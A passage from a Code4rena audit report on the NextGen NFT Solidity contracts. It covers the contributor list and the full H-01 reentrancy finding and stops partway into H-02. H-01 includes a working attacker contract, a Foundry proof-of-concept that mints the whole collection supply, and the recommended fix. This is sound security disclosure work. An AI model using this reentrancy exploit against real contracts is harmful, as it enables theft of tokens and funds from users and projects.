---
sponsor: "NextGen"
slug: "2023-10-nextgen"
date: "2024-01-08"
title: "NextGen"
findings: "https://github.com/code-423n4/2023-10-nextgen-findings/issues"
contest: 302
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the NextGen smart contract system written in Solidity. The audit took place between October 30 — November 13, 2023.

## Wardens

256 Wardens contributed reports to NextGen:

  1. [0x3b](https://code4rena.com/@0x3b)
  2. [AvantGard](https://code4rena.com/@AvantGard)
  3. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  4. [Krace](https://code4rena.com/@Krace)
  5. [immeas](https://code4rena.com/@immeas)
  6. [ZdravkoHr](https://code4rena.com/@ZdravkoHr)
  7. [dy](https://code4rena.com/@dy)
  8. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  9. [btk](https://code4rena.com/@btk)
  10. [7siech](https://code4rena.com/@7siech)
  11. [dimulski](https://code4rena.com/@dimulski)
  12. [t0x1c](https://code4rena.com/@t0x1c)
  13. [degensec](https://code4rena.com/@degensec)
  14. [KupiaSec](https://code4rena.com/@KupiaSec)
  15. [Draiakoo](https://code4rena.com/@Draiakoo)
  16. [oakcobalt](https://code4rena.com/@oakcobalt)
  17. [Myd](https://code4rena.com/@Myd)
  18. [VAD37](https://code4rena.com/@VAD37)
  19. [Haipls](https://code4rena.com/@Haipls)
  20. [r0ck3tz](https://code4rena.com/@r0ck3tz)
  21. [The\_Kakers](https://code4rena.com/@The_Kakers) ([juancito](https://code4rena.com/@juancito) and [oxizo](https://code4rena.com/@oxizo))
  22. [gumgumzum](https://code4rena.com/@gumgumzum)
  23. [nuthan2x](https://code4rena.com/@nuthan2x)
  24. [trachev](https://code4rena.com/@trachev)
  25. [0xlemon](https://code4rena.com/@0xlemon)
  26. [fibonacci](https://code4rena.com/@fibonacci)
  27. [Noro](https://code4rena.com/@Noro)
  28. [PetarTolev](https://code4rena.com/@PetarTolev)
  29. [Udsen](https://code4rena.com/@Udsen)
  30. [ast3ros](https://code4rena.com/@ast3ros)
  31. [REKCAH](https://code4rena.com/@REKCAH)
  32. [00xSEV](https://code4rena.com/@00xSEV)
  33. [xAriextz](https://code4rena.com/@xAriextz)
  34. [K42](https://code4rena.com/@K42)
  35. [xuwinnie](https://code4rena.com/@xuwinnie)
  36. [alexfilippov314](https://code4rena.com/@alexfilippov314)
  37. [mrudenko](https://code4rena.com/@mrudenko)
  38. [DeFiHackLabs](https://code4rena.com/@DeFiHackLabs) ([AkshaySrivastav](https://code4rena.com/@AkshaySrivastav), [Cache\_and\_Burn](https://code4rena.com/@Cache_and_Burn), [IceBear](https://code4rena.com/@IceBear), [Ronin](https://code4rena.com/@Ronin), [Sm4rty](https://code4rena.com/@Sm4rty), [SunSec](https://code4rena.com/@SunSec), [sashik\_eth](https://code4rena.com/@sashik_eth), [zuhaibmohd](https://code4rena.com/@zuhaibmohd) and [ret2basic](https://code4rena.com/@ret2basic))
  39. [Toshii](https://code4rena.com/@Toshii)
  40. [JohnnyTime](https://code4rena.com/@JohnnyTime)
  41. [catellatech](https://code4rena.com/@catellatech)
  42. [smiling\_heretic](https://code4rena.com/@smiling_heretic)
  43. [Al-Qa-qa](https://code4rena.com/@Al-Qa-qa)
  44. [Ruhum](https://code4rena.com/@Ruhum)
  45. [Jiamin](https://code4rena.com/@Jiamin)
  46. [bart1e](https://code4rena.com/@bart1e)
  47. [Tadev](https://code4rena.com/@Tadev)
  48. [rotcivegaf](https://code4rena.com/@rotcivegaf)
  49. [rahul](https://code4rena.com/@rahul)
  50. [BugzyVonBuggernaut](https://code4rena.com/@BugzyVonBuggernaut)
  51. [Stryder](https://code4rena.com/@Stryder)
  52. [0xblackskull](https://code4rena.com/@0xblackskull)
  53. [zach](https://code4rena.com/@zach)
  54. [lsaudit](https://code4rena.com/@lsaudit)
  55. [SovaSlava](https://code4rena.com/@SovaSlava)
  56. [Fulum](https://code4rena.com/@Fulum)
  57. [Juntao](https://code4rena.com/@Juntao)
  58. [c3phas](https://code4rena.com/@c3phas)
  59. [JCK](https://code4rena.com/@JCK)
  60. [thekmj](https://code4rena.com/@thekmj)
  61. [0xAnah](https://code4rena.com/@0xAnah)
  62. [rishabh](https://code4rena.com/@rishabh)
  63. [bird-flu](https://code4rena.com/@bird-flu) ([BowTiedOriole](https://code4rena.com/@BowTiedOriole) and [bowtiedvirus](https://code4rena.com/@bowtiedvirus))
  64. [CaeraDenoir](https://code4rena.com/@CaeraDenoir)
  65. [circlelooper](https://code4rena.com/@circlelooper)
  66. [crunch](https://code4rena.com/@crunch)
  67. [ustas](https://code4rena.com/@ustas)
  68. [evmboi32](https://code4rena.com/@evmboi32)
  69. [peanuts](https://code4rena.com/@peanuts)
  70. [phoenixV110](https://code4rena.com/@phoenixV110)
  71. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  72. [merlin](https://code4rena.com/@merlin)
  73. [devival](https://code4rena.com/@devival)
  74. [PENGUN](https://code4rena.com/@PENGUN)
  75. [twcctop](https://code4rena.com/@twcctop)
  76. [zhaojie](https://code4rena.com/@zhaojie)
  77. [Jorgect](https://code4rena.com/@Jorgect)
  78. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  79. [Eigenvectors](https://code4rena.com/@Eigenvectors) ([Cosine](https://code4rena.com/@Cosine) and [timo](https://code4rena.com/@timo))
  80. [glcanvas](https://code4rena.com/@glcanvas)
  81. [niki](https://code4rena.com/@niki)
  82. [3th](https://code4rena.com/@3th)
  83. [Kose](https://code4rena.com/@Kose)
  84. [clara](https://code4rena.com/@clara)
  85. [SAAJ](https://code4rena.com/@SAAJ)
  86. [ihtishamsudo](https://code4rena.com/@ihtishamsudo)
  87. [cats](https://code4rena.com/@cats)
  88. [digitizeworx](https://code4rena.com/@digitizeworx)
  89. [funkornaut](https://code4rena.com/@funkornaut)
  90. [Viktor\_Cortess](https://code4rena.com/@Viktor_Cortess)
  91. [00decree](https://code4rena.com/@00decree)
  92. [oualidpro](https://code4rena.com/@oualidpro)
  93. [jacopod](https://code4rena.com/@jacopod)
  94. [cartlex\_](https://code4rena.com/@cartlex_)
  95. [0xAadi](https://code4rena.com/@0xAadi)
  96. [Kaysoft](https://code4rena.com/@Kaysoft)
  97. [Hama](https://code4rena.com/@Hama)
  98. [Audinarey](https://code4rena.com/@Audinarey)
  99. [Fitro](https://code4rena.com/@Fitro)
  100. [AS](https://code4rena.com/@AS)
  101. [audityourcontracts](https://code4rena.com/@audityourcontracts)
  102. [Arabadzhiev](https://code4rena.com/@Arabadzhiev)
  103. [HChang26](https://code4rena.com/@HChang26)
  104. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  105. [Madalad](https://code4rena.com/@Madalad)
  106. [openwide](https://code4rena.com/@openwide)
  107. [epistkr](https://code4rena.com/@epistkr)
  108. [petrichor](https://code4rena.com/@petrichor)
  109. [DavidGiladi](https://code4rena.com/@DavidGiladi)
  110. [0xSolus](https://code4rena.com/@0xSolus)
  111. [dharma09](https://code4rena.com/@dharma09)
  112. [hihen](https://code4rena.com/@hihen)
  113. [leegh](https://code4rena.com/@leegh)
  114. [tpiliposian](https://code4rena.com/@tpiliposian)
  115. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  116. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  117. [pipidu83](https://code4rena.com/@pipidu83)
  118. [xiao](https://code4rena.com/@xiao)
  119. [Neon2835](https://code4rena.com/@Neon2835)
  120. [tnquanghuy0512](https://code4rena.com/@tnquanghuy0512)
  121. [ayden](https://code4rena.com/@ayden)
  122. [sces60107](https://code4rena.com/@sces60107)
  123. [ubl4nk](https://code4rena.com/@ubl4nk)
  124. [Kow](https://code4rena.com/@Kow)
  125. [volodya](https://code4rena.com/@volodya)
  126. [innertia](https://code4rena.com/@innertia)
  127. [0xarno](https://code4rena.com/@0xarno)
  128. [Nyx](https://code4rena.com/@Nyx)
  129. [mojito\_auditor](https://code4rena.com/@mojito_auditor)
  130. [Zac](https://code4rena.com/@Zac)
  131. [0xMAKEOUTHILL](https://code4rena.com/@0xMAKEOUTHILL)
  132. [ABA](https://code4rena.com/@ABA)
  133. [0xSwahili](https://code4rena.com/@0xSwahili)
  134. [ohm](https://code4rena.com/@ohm) ([0x\_kmr\_](https://code4rena.com/@0x_kmr_) and [0x4ka5h](https://code4rena.com/@0x4ka5h))
  135. [0xJuda](https://code4rena.com/@0xJuda)
  136. [ke1caM](https://code4rena.com/@ke1caM)
  137. [DarkTower](https://code4rena.com/@DarkTower) ([Gelato\_ST](https://code4rena.com/@Gelato_ST), [Maroutis](https://code4rena.com/@Maroutis), [OxTenma](https://code4rena.com/@OxTenma) and [0xrex](https://code4rena.com/@0xrex))
  138. [codynhat](https://code4rena.com/@codynhat)
  139. [0xAsen](https://code4rena.com/@0xAsen)
  140. [TuringConsulting](https://code4rena.com/@TuringConsulting) ([0xadrii](https://code4rena.com/@0xadrii), [JosepBove](https://code4rena.com/@JosepBove) and [Saintcode\_](https://code4rena.com/@Saintcode_))
  141. [Greed](https://code4rena.com/@Greed)
  142. [0xDetermination](https://code4rena.com/@0xDetermination)
  143. [NoamYakov](https://code4rena.com/@NoamYakov)
  144. [Vagner](https://code4rena.com/@Vagner)
  145. [MaNcHaSsS](https://code4rena.com/@MaNcHaSsS)
  146. [yojeff](https://code4rena.com/@yojeff)
  147. [CSL](https://code4rena.com/@CSL) ([shaflow2](https://code4rena.com/@shaflow2), [steadyman](https://code4rena.com/@steadyman), [levi\_104](https://code4rena.com/@levi_104) and [BY\_DLIFE](https://code4rena.com/@BY_DLIFE))
  148. [Valix](https://code4rena.com/@Valix) ([0x8e88](https://code4rena.com/@0x8e88), [merlinboii](https://code4rena.com/@merlinboii), [JokerStudio](https://code4rena.com/@JokerStudio) and [62theories](https://code4rena.com/@62theories))
  149. [NentoR](https://code4rena.com/@NentoR)
  150. [Talfao](https://code4rena.com/@Talfao)
  151. [0xpiken](https://code4rena.com/@0xpiken)
  152. [flacko](https://code4rena.com/@flacko)
  153. [Soul22](https://code4rena.com/@Soul22)
  154. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  155. [0xhunter](https://code4rena.com/@0xhunter)
  156. [nmirchev8](https://code4rena.com/@nmirchev8)
  157. [0xWaitress](https://code4rena.com/@0xWaitress)
  158. [ChrisTina](https://code4rena.com/@ChrisTina)
  159. [\_eperezok](https://code4rena.com/@_eperezok)
  160. [xeros](https://code4rena.com/@xeros)
  161. [bdmcbri](https://code4rena.com/@bdmcbri)
  162. [Bauchibred](https://code4rena.com/@Bauchibred)
  163. [alexxander](https://code4rena.com/@alexxander)
  164. [bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe)
  165. [Tricko](https://code4rena.com/@Tricko)
  166. [0x180db](https://code4rena.com/@0x180db)
  167. [amaechieth](https://code4rena.com/@amaechieth)
  168. [cu5t0mpeo](https://code4rena.com/@cu5t0mpeo)
  169. [Delvir0](https://code4rena.com/@Delvir0)
  170. [0x\_6a70](https://code4rena.com/@0x_6a70)
  171. [Ocean\_Sky](https://code4rena.com/@Ocean_Sky)
  172. [spark](https://code4rena.com/@spark)
  173. [BugsFinder0x](https://code4rena.com/@BugsFinder0x)
  174. [Taylor\_Webb](https://code4rena.com/@Taylor_Webb)
  175. [Timenov](https://code4rena.com/@Timenov)
  176. [sl1](https://code4rena.com/@sl1)
  177. [droptpackets](https://code4rena.com/@droptpackets)
  178. [seeques](https://code4rena.com/@seeques)
  179. [pontifex](https://code4rena.com/@pontifex)
  180. [836541](https://code4rena.com/@836541)
  181. [ilchovski](https://code4rena.com/@ilchovski)
  182. [Aymen0909](https://code4rena.com/@Aymen0909)
  183. [0xraion](https://code4rena.com/@0xraion)
  184. [0x175](https://code4rena.com/@0x175)
  185. [stackachu](https://code4rena.com/@stackachu)
  186. [Neo\_Granicen](https://code4rena.com/@Neo_Granicen)
  187. [EricWWFCP](https://code4rena.com/@EricWWFCP)
  188. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout) and [ali\_shehab](https://code4rena.com/@ali_shehab))
  189. [kk\_krish](https://code4rena.com/@kk_krish)
  190. [turvy\_fuzz](https://code4rena.com/@turvy_fuzz)
  191. [Beosin](https://code4rena.com/@Beosin)
  192. [critical-or-high](https://code4rena.com/@critical-or-high)
  193. [joesan](https://code4rena.com/@joesan)
  194. [y4y](https://code4rena.com/@y4y)
  195. [danielles0xG](https://code4rena.com/@danielles0xG)
  196. [jasonxiale](https://code4rena.com/@jasonxiale)
  197. [ciphermarco](https://code4rena.com/@ciphermarco)
  198. [Inference](https://code4rena.com/@Inference)
  199. [slvDev](https://code4rena.com/@slvDev)
  200. [0xgrbr](https://code4rena.com/@0xgrbr)
  201. [0xMango](https://code4rena.com/@0xMango)
  202. [inzinko](https://code4rena.com/@inzinko)
  203. [Silvermist](https://code4rena.com/@Silvermist)
  204. [mahyar](https://code4rena.com/@mahyar)
  205. [dethera](https://code4rena.com/@dethera)
  206. [Zach\_166](https://code4rena.com/@Zach_166)
  207. [0x656c68616a](https://code4rena.com/@0x656c68616a)
  208. [aslanbek](https://code4rena.com/@aslanbek)
  209. [tallo](https://code4rena.com/@tallo)
  210. [darksnow](https://code4rena.com/@darksnow)
  211. [cccz](https://code4rena.com/@cccz)
  212. [cryptothemex](https://code4rena.com/@cryptothemex)
  213. [blutorque](https://code4rena.com/@blutorque)
  214. [vangrim](https://code4rena.com/@vangrim)
  215. [c0pp3rscr3w3r](https://code4rena.com/@c0pp3rscr3w3r)
  216. [yobiz](https://code4rena.com/@yobiz)
  217. [shenwilly](https://code4rena.com/@shenwilly)
  218. [Oxsadeeq](https://code4rena.com/@Oxsadeeq)
  219. [aldarion](https://code4rena.com/@aldarion)
  220. [Norah](https://code4rena.com/@Norah)
  221. [0xsagetony](https://code4rena.com/@0xsagetony)
  222. [ak1](https://code4rena.com/@ak1)
  223. [TermoHash](https://code4rena.com/@TermoHash)
  224. [orion](https://code4rena.com/@orion)
  225. [Shubham](https://code4rena.com/@Shubham)
  226. [8olidity](https://code4rena.com/@8olidity)
  227. [max10afternoon](https://code4rena.com/@max10afternoon)
  228. [kimchi](https://code4rena.com/@kimchi)
  229. [0xMosh](https://code4rena.com/@0xMosh)
  230. [Deft\_TT](https://code4rena.com/@Deft_TT)
  231. [0xAleko](https://code4rena.com/@0xAleko)
  232. [AerialRaider](https://code4rena.com/@AerialRaider)

This audit was judged by [0xsomeone](https://code4rena.com/@0xsomeone).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 14 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 12 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 19 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 NextGen repository](https://github.com/code-423n4/2023-10-nextgen), and is composed of 8 smart contracts written in the Solidity programming language and includes 1265 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **Hound** from warden DadeKuma, generated the [Automated Findings report](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (5)
## [[H-01] Attacker can reenter to mint all the collection supply](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517)
*Submitted by [btk](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517), also found by [sl1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2049), [836541](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2011), [alexxander](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1947), [ilchovski](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1928), [Kose](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1877), [pontifex](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1859), PetarTolev ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1857), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1580), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1238)), [ChrisTina](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1808), [Tricko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1803), [DarkTower](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1795), [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1742), [immeas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1708), [Aymen0909](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1700), [sces60107](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1694), [phoenixV110](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1660), [0xraion](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1635), [0x175](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1626), [trachev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1448), [3th](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1445), [droptpackets](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1440), [Talfao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1380), [0xJuda](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1377), [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1367), [smiling\_heretic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1343), [stackachu](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1330), [seeques](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1270), [MrPotatoMagic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1154), [codynhat](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1147), [audityourcontracts](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1128), [ustas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1114), [jacopod](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1104), [Neo\_Granicen](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1076), [bronze\_pickaxe](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1065), [PENGUN](https://github.com/code-423n4/2023-10-nextgen-findings/issues/993), [bird-flu](https://github.com/code-423n4/2023-10-nextgen-findings/issues/980), [EricWWFCP](https://github.com/code-423n4/2023-10-nextgen-findings/issues/961), [ke1caM](https://github.com/code-423n4/2023-10-nextgen-findings/issues/757), [Viktor\_Cortess](https://github.com/code-423n4/2023-10-nextgen-findings/issues/753), [The\_Kakers](https://github.com/code-423n4/2023-10-nextgen-findings/issues/742), [fibonacci](https://github.com/code-423n4/2023-10-nextgen-findings/issues/691), [ayden](https://github.com/code-423n4/2023-10-nextgen-findings/issues/638), [Al-Qa-qa](https://github.com/code-423n4/2023-10-nextgen-findings/issues/557), [0xpiken](https://github.com/code-423n4/2023-10-nextgen-findings/issues/538), [xAriextz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/406), [ubl4nk](https://github.com/code-423n4/2023-10-nextgen-findings/issues/398), [\_eperezok](https://github.com/code-423n4/2023-10-nextgen-findings/issues/367), [degensec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/337), [flacko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/272), [evmboi32](https://github.com/code-423n4/2023-10-nextgen-findings/issues/188), [kk\_krish](https://github.com/code-423n4/2023-10-nextgen-findings/issues/58), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/51), [gumgumzum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2050), [turvy\_fuzz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2039), [Toshii](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1469), [mojito\_auditor](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1449), [SovaSlava](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1392), [AvantGard](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1318), [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1206), [xuwinnie](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1186), [SpicyMeatball](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1057), [Kow](https://github.com/code-423n4/2023-10-nextgen-findings/issues/953), [KupiaSec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/902), [VAD37](https://github.com/code-423n4/2023-10-nextgen-findings/issues/850), 0xAlix2 ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/724), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/718)), [Ruhum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/555), [0x180db](https://github.com/code-423n4/2023-10-nextgen-findings/issues/396), [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/192), [t0x1c](https://github.com/code-423n4/2023-10-nextgen-findings/issues/186), [Beosin](https://github.com/code-423n4/2023-10-nextgen-findings/issues/59), [critical-or-high](https://github.com/code-423n4/2023-10-nextgen-findings/issues/43), [innertia](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1828), [nuthan2x](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1529), [joesan](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1022), [danielles0xG](https://github.com/code-423n4/2023-10-nextgen-findings/issues/775), [Soul22](https://github.com/code-423n4/2023-10-nextgen-findings/issues/648), and [y4y](https://github.com/code-423n4/2023-10-nextgen-findings/issues/528)*

An attacker can reenter the `MinterContract::mint` function, bypassing the `maxCollectionPurchases` check and minting the entire collection supply.

### Proof of Concept

The vulnerability stems from the absence of the [Check Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) pattern. As seen here, `NextGenCore::mint` updates the `tokensMintedAllowlistAddress` and `tokensMintedPerAddress` after making an external call:

```solidity
    // Minting logic is here
    if (phase == 1) {
        tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;
    } else {
        tokensMintedPerAddress[_collectionID][_mintingAddress]++;
    }
}
```

### Exploitation Steps:

- Attacker calls `MinterContract::mint` with a malicious contract as the receiver.
- The malicious contract executes a crafted `onERC721Received()`.
- `MinterContract::mint` invokes `NextGenCore::mint`, which uses `_safeMint()` internally.
- `_safeMint()` calls `_recipient.onERC721Received()`, leading to the minting of the complete collection supply.

### An example of the attacker `onERC721Received()` implementation:

```solidity
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        (, , uint256 circulationSupply, uint256 totalSupply, , ) = nextGenCore
            .retrieveCollectionAdditionalData(1);

        if (circulationSupply == totalSupply)
            return this.onERC721Received.selector;

        bytes32[] memory merkleProof = new bytes32[](1);
        merkleProof[0] = bytes32(0);
        minterContract.mint{value: 1e18}({
            _collectionID: 1,
            _numberOfTokens: 1,
            _maxAllowance: 0,
            _tokenData: "",
            _mintTo: address(this),
            merkleProof: merkleProof,
            _delegator: address(0),
            _saltfun_o: 0
        });

        return this.onERC721Received.selector;
    }
```

### Here is a coded PoC to demonstrate the issue:

```solidity
    function testMintAllTheCollection() public {
        bytes32[] memory merkleProof = setUpArrayBytes(1);
        merkleProof[0] = bytes32(0);

        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        MintAllSupply mintAllSupply = new MintAllSupply(minterContract, nextGenCore);

        deal(address(mintAllSupply), 49e18);

        vm.warp(block.timestamp + 1 days);

        console.log("(Collection Circulation Supply Before)      = ", nextGenCore.viewCirSupply(1));
        console.log("(Balance of attacker contract Before)       = ", address(mintAllSupply).balance);
        console.log("(Col 1 Balance of attacker contract Before) = ", nextGenCore.balanceOf(address(mintAllSupply)));

        hoax(attacker, 1e18);
        minterContract.mint{ value: 1e18}({
            _collectionID: 1,
            _numberOfTokens: 1,
            _maxAllowance: 0,
            _tokenData: "",
            _mintTo: address(mintAllSupply),
            merkleProof: merkleProof,
            _delegator: address(0),
            _saltfun_o: 0
        });

        console.log("(Collection Circulation Supply After)       = ", nextGenCore.viewCirSupply(1));
        console.log("(Balance of attacker contract After)        = ", address(mintAllSupply).balance);
        console.log("(Col 1 Balance of attacker contract After)  = ", nextGenCore.balanceOf(address(mintAllSupply)));
    }
```

### Logs result:

```yaml
  (Collection Circulation Supply Before)      :  0
  (Balance of attacker contract Before)       :  49000000000000000000
  (Col 1 Balance of attacker contract Before) :  0
  (Collection Circulation Supply After)       :  50
  (Balance of attacker contract After)        :  0
  (Col 1 Balance of attacker contract After)  :  50
```

### Test Setup:

- Clone the repository: <https://github.com/0xbtk/NextGen-Setup.git>.
- Add the attacker's contract in the Helpers folder from this [link](https://gist.github.com/0xbtk/57496ae3761917c2f0e9f6ac3d23c300#file-mintallsupply-sol).
- Incorporate the tests in `NextGenSecurityReview`.
- Execute: `forge test --mt testMintAllTheCollection -vvv`.

### Recommended Mitigation Steps

We recommend following [Check Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) in `NextGenCore::mint` as follow:

```solidity
    if (phase == 1) {
        tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;
    } else {
        tokensMintedPerAddress[_collectionID][_mintingAddress]++;
    }
    // Minting logic should be here
}
```

### Assessed type

Reentrancy

**[a2rocket (NextGen) confirmed via duplicate issue #51](https://github.com/code-423n4/2023-10-nextgen-findings/issues/51#issuecomment-1822678898)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1839451072):**
 > The Warden has illustrated how a re-entrant EIP-721 hook can be exploited to bypass the allowlist/public limitations set forth for a collection.
> 
> The Sponsor has confirmed the finding and I deem it valid as the code will update the minted per address mappings **after the "safe" mint operation**, thereby being susceptible to the re-entrancy described. Its severity of "high" is also deemed correct given that a main invariant of the system (mint limitations so scarcity of an NFT) can be broken arbitrarily as the re-entrancy attack can be repetitively replayed.
> 
> The Warden's submission was selected as the best due to its correct remediation relying on enforcement of the CEI pattern, short-and-sweet PoC, and overall clean submission.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1847710278):**
 > After discussions with fellow judges, I have opted to split re-entrancy vulnerabilities into two separate instances:
> 
> - Absence of the CEI Pattern in [`NextGenCore::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199)
> - Absence of the CEI Pattern in [`MinterContract::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253)
> 
> In my opinion, those two constitute different vulnerabilities as they relate to different state variables. The rationale behind this "split" is that when we consider the root cause for a vulnerability to render two submissions distinct, we have to treat a re-entrancy as a desirable trait of the EVM. Additionally, we cannot assume a rational fix is the application of the `ReentrancyGuard::nonReentrant` modifier; **the enforcement of the CEI pattern** is widely recognized as the "correct" way to resolve these issues.
> 
> This assumption falls in line with what the Solidity documentation has **instructed since its inception**, given that the security considerations of the language clearly state that the CEI pattern [should be applied and do not mention "re-entrancy" guards](https://docs.soliditylang.org/en/v0.8.23/security-considerations.html#reentrancy). As such, the root causes described in this issue are two unique ones: 
> 
> - [#1517](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517): Absence of the CEI Pattern in [`NextGenCore::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199)
> - [#2048](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2048): Absence of the CEI Pattern in [`MinterContract::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253)
> 
> EDIT: After further consideration, I have opted to retain only this submission as a valid of the two.
> 
> The absence of the CEI pattern in #2048 leads to an incorrect `getPrice` being utilized for multiple **valid** mints in a period, and no Warden identified that particular aspect that is vulnerable. As such, I have proceeded to invalidate the submission and its duplicates.

***

## [[H-02] Attacker can drain all ETH from `AuctionDemo` when `block.timestamp == auctionEndTime`](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323)
*Submitted by [smiling\_heretic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323), also found by [0xgrbr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1931), [0xMango](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1929), [merlin](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1912), [devival](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1904), [alexxander](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1899), DeFiHackLabs ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1819), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1006)), Udsen ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1811), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1788)), [inzinko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1787), ciphermarco ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1786), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1784)), [TuringConsulting](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1772), Madalad ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1754), 